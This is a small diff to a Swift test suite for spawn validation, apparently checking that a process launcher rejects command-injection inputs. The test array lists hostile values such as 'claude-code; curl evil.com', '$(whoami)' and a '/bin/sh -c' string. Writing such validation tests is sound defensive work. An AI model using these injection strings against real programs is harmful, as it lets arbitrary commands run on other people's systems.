@@ -130,7 +130,7 @@ struct SpawnValidationTests {
             "claude-code; curl evil.com",
             "$(whoami)",
             "`whoami`",
-            "/bin/sh -c 'evil'",
+            "/bin/sh -c 'evil'"
         ]
         for payload in payloads {
             do {
